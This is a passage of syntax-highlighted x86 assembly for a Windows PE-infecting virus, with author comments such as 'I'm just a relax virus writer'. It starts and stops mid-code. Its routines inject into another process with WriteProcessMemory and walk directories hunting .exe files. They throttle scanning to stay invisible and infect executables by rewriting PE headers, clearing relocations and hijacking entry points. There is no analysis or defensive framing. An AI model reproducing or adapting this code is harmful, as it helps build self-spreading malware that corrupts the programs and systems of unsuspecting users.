</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">fino</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Residency2</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">; I'm sad like hell today</span><span class="sc0">
                        </span><span class="sc1">; I feel bad like I never felt</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">                      </span><span class="sc1">; bad....</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">reserror</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">finishcheckres</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">reserror</span><span class="sc4">],</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">finishcheckres</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InitCritical</span><span class="sc0">                            </span><span class="sc1">; we don't want</span><span class="sc0">
                                                </span><span class="sc1">; to be perturbed</span><span class="sc0">
                                                </span><span class="sc1">; during the operation</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PseudoData</span><span class="sc4">]</span><span class="sc0"> 
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                                     </span><span class="sc1">; NumbWrite</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Pseudoreturn</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                                     </span><span class="sc1">; Buffer</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Ourmemory</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">checktest</span><span class="sc4">-</span><span class="sc5">AnnoyingCode</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                                     </span><span class="sc1">; process base</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">processid</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">; processID</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReadProcessMemory</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Pseudoreturn</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">finishcheckresb</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Pseudoreturn</span><span class="sc4">],</span><span class="sc12">'yakO'</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">finishcheckresb</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PseudoData</span><span class="sc4">]</span><span class="sc0"> 
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                                     </span><span class="sc1">; NumbWrite</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">pseudofin</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">start</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                                     </span><span class="sc1">; Buffer</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Pseudoreturn</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">processid</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">; processID</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WriteProcessMemory</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PseudoData</span><span class="sc4">]</span><span class="sc0"> 
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                                     </span><span class="sc1">; NumbWrite</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">moins1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                                     </span><span class="sc1">; Buffer</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Ourmemory</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">checktest</span><span class="sc4">-</span><span class="sc5">AnnoyingCode</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">processid</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">; processID</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WriteProcessMemory</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">finishcheckresb</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LeaveCritical</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">reserror</span><span class="sc4">],</span><span class="sc2">5</span><span class="sc0">       </span><span class="sc1">; okay all done ;)</span><span class="sc0">

</span><span class="sc5">finishcheckres</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">moins1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Okay'</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; That's funny dir killer, I should rewrite Voodoo with it, it's much powerfull</span><span class="sc0">
</span><span class="sc1">; and smaller</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">Killdir</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">numbscan</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; mmm for speed </span><span class="sc0">
                            </span><span class="sc1">; restriction</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">originaldir</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">makescandir</span><span class="sc0">                 </span><span class="sc1">; we put *.*</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filedata</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">originaldir</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindFirstFileA</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; look 1st File</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">finishattack</span><span class="sc0">                    </span><span class="sc1">; error (that shouldn't</span><span class="sc0">
                            </span><span class="sc1">; arrive) ? close...</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">findnextfileA</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filedata</span><span class="sc4">+</span><span class="sc2">2Ch</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">         </span><span class="sc1">; check if . or ..</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">willbeback</span><span class="sc0">                  </span><span class="sc1">; go away</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">numbscan</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; then go away</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">numbscan</span><span class="sc4">],</span><span class="sc2">5</span><span class="sc0">           </span><span class="sc1">; each 5 file scanned</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">donpanic</span><span class="sc0">                    </span><span class="sc1">; then wait a bit</span><span class="sc0">
                            </span><span class="sc1">; make scan invisble</span><span class="sc0">
</span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">waitscan</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; so wait waitscan </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; value (depends on</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Sleep0</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; residency)</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">numbscan</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">donpanic</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filedata</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; check if directory</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">attackfile</span><span class="sc0">                  </span><span class="sc1">; yeah? Okay, fine</span><span class="sc0">
                            </span><span class="sc1">; attack this sub</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">KillSubDir</span><span class="sc0">                  </span><span class="sc1">; bastard!!!</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">willbeback</span><span class="sc0">

</span><span class="sc5">attackfile</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">checkext</span><span class="sc0">                                </span><span class="sc1">; check if this is exe file </span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'exe'</span><span class="sc0">               </span><span class="sc1">; is this an exe file</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">attackfile2</span><span class="sc0">             </span><span class="sc1">; (I don't want to annoy </span><span class="sc0">
                        </span><span class="sc1">; DLL or CPL or OCX,I'm just</span><span class="sc0">
                        </span><span class="sc1">; a relax virus writer...)</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Open_file</span><span class="sc0">                  </span><span class="sc1">; open file</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This is an old-school infection method, it don't need to map the file into</span><span class="sc0">
</span><span class="sc1">; memory, but jusk seek-write-read and could be used by readaptating the </span><span class="sc0">
</span><span class="sc1">; following routine to dos compatibility:</span><span class="sc0">
</span><span class="sc1">;       Seek_file Location=edx</span><span class="sc0">
</span><span class="sc1">;       Read_file Buffer=edx Length=ecx</span><span class="sc0">
</span><span class="sc1">;       Write_file Buffer=edx Length=ecx</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; It's basically designed for infecting PE :)</span><span class="sc0">

</span><span class="sc5">Infection</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">; Pseudo :]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infcount</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">maxinf</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">        </span><span class="sc1">; we can't infect </span><span class="sc0">
                            </span><span class="sc1">; too much in </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">03ch</span><span class="sc0">                </span><span class="sc1">; per process mode</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek_file</span><span class="sc0">       

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                 </span><span class="sc1">; read if it's PE</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReadyForHost</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Read_file</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReadyForHost</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; seek</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HeaderOffset</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek_file</span><span class="sc0">               </span><span class="sc1">; </span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc2">4096</span><span class="sc4">/</span><span class="sc2">2</span><span class="sc4">)+</span><span class="sc2">0f8h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReadyForHost</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; </span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Read_file</span><span class="sc0">               </span><span class="sc1">; so we read needed</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; infos from file</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReadyForHost</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">    </span><span class="sc1">; PE signature</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">CloseFile</span><span class="sc0">               </span><span class="sc1">; check</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReadyForHost</span><span class="sc4">+</span><span class="sc2">66</span><span class="sc4">],</span><span class="sc12">'0s'</span><span class="sc0"> </span><span class="sc1">; test if we are there</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">CloseFile</span><span class="sc0">               </span><span class="sc1">; Checksum, should </span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReadyForHost</span><span class="sc4">+</span><span class="sc2">66</span><span class="sc4">],</span><span class="sc12">'0s'</span><span class="sc0"> </span><span class="sc1">; remove that</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReadyForHost</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; </span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">160</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; reset fixups</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">164</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
    
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0F8h</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; this start of </span><span class="sc0">
                            </span><span class="sc1">; section entry</span><span class="sc0">
</span><span class="sc5">nullifyreloc</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">; should have to</span><span class="sc0">
                            </span><span class="sc1">; modify that a day</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; and sections</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; reseting fixups</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">

    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">nullifyreloc</span><span class="sc0">                </span><span class="sc1">; go away reloc, bad</span><span class="sc0">
                            </span><span class="sc1">; nightmare</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReadyForHost</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; saving entrypoint</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">     
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReadyForHost</span><span class="sc4">+</span><span class="sc2">52</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; and get memory adres</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Return</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">      </span><span class="sc1">; storing esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Restore</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">     </span><span class="sc1">; storing esi again</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReadyForHost</span><span class="sc4">+</span><span class="sc2">0f8h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; start of 1st</span><span class="sc0">
                            </span><span class="sc1">; section</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; look for eax</span><span class="sc0">
